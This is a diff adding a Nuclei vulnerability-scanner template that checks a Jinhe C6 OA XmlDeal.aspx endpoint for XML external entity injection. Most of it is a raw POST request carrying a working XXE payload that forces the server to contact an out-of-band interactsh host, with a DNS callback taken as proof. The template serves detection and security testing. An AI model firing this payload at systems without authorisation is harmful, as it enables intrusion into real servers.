@@ -1,0 +1,25 @@
+id: jinhe-c6-XmlDeal-xxe
+
+info:
+  name: jinhe-c6-XmlDeal-xxe
+  author: jinhe-c6-XmlDeal-xxe
+  severity: high
+
+
+http:
+  - raw:
+      - |-
+        POST /c6/Jhsoft.Web.message/XmlDeal.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+        Connection: close
+        Content-Type: application/Xml
+        Accept-Encoding: gzip
+
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/"> %remote;]>'
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
